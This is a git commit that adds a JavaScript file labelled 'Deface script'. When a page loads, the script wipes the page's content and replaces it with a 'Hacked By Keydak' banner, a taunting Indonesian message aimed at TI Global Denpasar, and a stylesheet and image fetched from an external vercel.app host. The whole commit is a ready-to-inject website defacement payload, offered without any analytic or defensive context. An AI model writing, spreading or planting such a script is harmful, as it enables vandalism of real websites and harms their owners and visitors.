0cfaf16f633fafd479aae299279ef2b1262d4ae8
Keydak <139828741+Keydak@users.noreply.github.com>
2024-05-06 23:58:27 +0800

    123

---
+++ 45.js
@@ -0,0 +1,34 @@
+// Deface script
+document.addEventListener('DOMContentLoaded', function () {
+
+    document.documentElement.innerHTML = '';
+
+
+    var newHtmlContent = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta http-equiv="X-UA-Compatible" content="IE=edge">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>Home - Hacked By Keydak</title>
+            <link rel="stylesheet" href="https://kepo-six.vercel.app/style.css">
+        </head>
+        <body>
+            <div class="mainContainer">
+                <div class="img">
+                    <img class="mainImage" src="https://kepo-six.vercel.app/jett.png" alt="image" style="width: 400px;">
+                </div>
+                <h1> Hacked By Keydak</h1>
+                <hr class="hr">
+                <div class="container">
+                    <p class="text1">Dari TI Global Denpasar, Kapan TI global denpasar ngadain tournament valorant?????</p>
+                </div>
+            </div>
+        </body>
+        </html>
+    `;
+
+
+    document.documentElement.innerHTML = newHtmlContent;
+});
